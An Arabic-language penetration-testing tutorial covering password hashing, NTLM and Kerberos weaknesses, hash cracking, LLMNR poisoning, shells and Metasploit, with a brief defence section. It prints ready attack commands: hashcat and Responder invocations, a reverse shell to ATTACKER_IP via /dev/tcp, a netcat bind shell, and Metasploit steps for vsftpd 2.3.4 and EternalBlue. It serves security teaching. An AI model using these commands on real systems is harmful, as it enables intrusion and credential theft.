🔑 ثانياً: Password Hashing — كيف تُخزَّن الباسوردات؟

🧠 ما هو الـ Hash؟

الـ Hash هو تحويل الباسورد لنص مشفر بطريقة أحادية الاتجاه — يمكن تحويل الباسورد للـ Hash لكن لا يمكن العكس مباشرة.

password
↓ MD5
5f4dcc3b5aa765d61d8327deb882cf99
🧂 ما هو الـ Salt؟

الـ Salt هو قيمة عشوائية تُضاف للباسورد قبل التشفير — يمنع هجمات الـ Rainbow Tables لأن نفس الباسورد يُنتج هاشات مختلفة.

password + xK9#mZ
↓ bcrypt
$2y$10$xK9mZ...unique_hash
📊 أنواع الـ Hash الشائعة:
النوعالطولمستوى الأمانالاستخدام
MD532 حرف⚠️ ضعيف جداًقديم، لا يُنصح به
SHA-140 حرف⚠️ ضعيفقديم، Git commits
SHA-25664 حرف✅ جيدSSL, Blockchain
bcrypt60 حرف✅ ممتازتخزين باسوردات المواقع
NTLM32 حرف⚠️ متوسطWindows Authentication

🪟 ثالثاً: Windows Authentication Protocols

NTLM — النظام القديم

يعمل بالـ Hash بدلاً من الباسورد الحقيقي. الجهاز بيبعت الـ Hash ويتحقق منه بدون إرسال الباسورد نفسه.

🎯 نقطة ضعف:

يمكن سرقة الـ Hash واستخدامه مباشرة دون كسره!
→ Pass-the-Hash Attack 🔥

Kerberos — النظام الحديث

يعمل بنظام التذاكر (Tickets). المستخدم يحصل على TGT (Ticket Granting Ticket) ثم يستخدمه للوصول للخدمات.

🎯 نقطة ضعف:

يمكن سرقة التذاكر من الذاكرة
→ Pass-the-Ticket / Kerberoasting

🔓 رابعاً: Password Cracking — كسر الباسوردات

📖 Dictionary Attack

يجرب كلمات من قاموس (rockyou.txt). الأسرع ويغطي الباسوردات الشائعة.

💪 Brute Force

يجرب كل التركيبات الممكنة. بطيء جداً لكن لا يفوته شيء.

🔀 Hybrid Attack

يجمع القاموس + تعديلات (مثال: password1, P@ssword!).

🌈 Rainbow Table

جداول جاهزة بالـ Hashes — سريع جداً لكن لا يعمل مع الـ Salt.

⚡ Hashcat — أقوى أداة كسر هاش في العالم GPU Powered 🔥
hash-identifier # خطوة 1: حدد نوع الهاش أولاً
hashcat -m 0 hash.txt rockyou.txt # -m 0 = MD5
hashcat -m 1000 hash.txt rockyou.txt # -m 1000 = NTLM
hashcat -m 1800 hash.txt rockyou.txt # -m 1800 = SHA-512 (Linux)
hashcat --help | grep -i "hash modes" # شوف كل الـ modes
📌 للحصول على Wordlist rockyou.txt في Kali:
gzip -d /usr/share/wordlists/rockyou.txt.gz

☠️ خامساً: LLMNR Poisoning — أخطر هجوم على الشبكة الداخلية

🧠 كيف يعمل الهجوم؟
  1. جهاز في الشبكة يطلب اسم سيرفر \\FILESERVER
  2. الـ DNS مش عارف الجواب
  3. الجهاز يسأل الشبكة كلها: "مين يعرف FILESERVER؟"
  4. أنت (المهاجم) ترد: "أنا FILESERVER!" 😈
  5. الجهاز الضحية يبعتلك الـ NTLM Hash تلقائياً!
⚡ Responder — أداة الهجوم
responder -I eth0
responder -I eth0 -rdwv # كل الـ protocols

بعد التقاط الـ Hash:

hashcat -m 5600 captured_hash.txt rockyou.txt

-m 5600 = NTLMv2

🎯 يعمل على أي شبكة Windows داخلية — بدون باسورد أو صلاحيات!

💻 سادساً: Shells — بوابة التحكم في الجهاز

بعد استغلال الثغرة، ستحصل على Shell — وهو سطر أوامر مباشر على الجهاز المخترق.

🔄 Reverse Shell
⭐ الأهم

الضحية يتصل بجهازك أنت — يتخطى الـ Firewall!

على جهازك (Attacker) — استمع:

nc -lvnp 4444

على جهاز الضحية — ابعت الـ Shell:

bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
🔗 Bind Shell
محدود

أنت تتصل بالضحية — لكن الـ Firewall غالباً يبلوكه.

على جهاز الضحية — افتح بورت:

nc -lvnp 4444 -e /bin/bash

على جهازك — اتصل:

nc -nv VICTIM_IP 4444
💡 موقع ممتاز لتوليد Reverse Shells جاهزة: revshells.com — يدعم Python, PHP, PowerShell, Java, وأكثر!

💣 سابعاً: Metasploit — صاروخ الاختراق

Metasploit هو إطار عمل كامل للاختراق يحتوي على آلاف الـ Exploits الجاهزة.

🔥 مثال 1: استغلال vsftpd 2.3.4 Backdoor
1. تشغيل Metasploit:
msfconsole
2. اختيار الـ Exploit:
use exploit/unix/ftp/vsftpd_234_backdoor
3. تحديد الهدف:
set RHOSTS 192.168.1.5
4. الهجوم:
run

💀 مثال 2: EternalBlue — ثغرة WannaCry الشهيرة CVE-2017-0144

ثغرة في SMB على Windows — استخدمتها NSA ثم سُرقت وأُستخدمت في هجوم WannaCry 2017!

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.5
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST YOUR_IP
run

🛡️ Countermeasures — كيف تحمي نفسك؟

🔑 Passwords قوية

12+ حرف، أرقام، رموز. لا تستخدم نفس الباسورد في أماكن متعددة.

🚫 Disable LLMNR

من Group Policy → لا تدع الأجهزة تسأل الشبكة عن الأسماء.

🔐 Kerberos لا NTLM

قلل استخدام NTLM وفعّل Kerberos في كل البيئة.

📦 Patch دائماً

حدّث الأنظمة فوراً — EternalBlue كان له Patch قبل هجوم WannaCry!
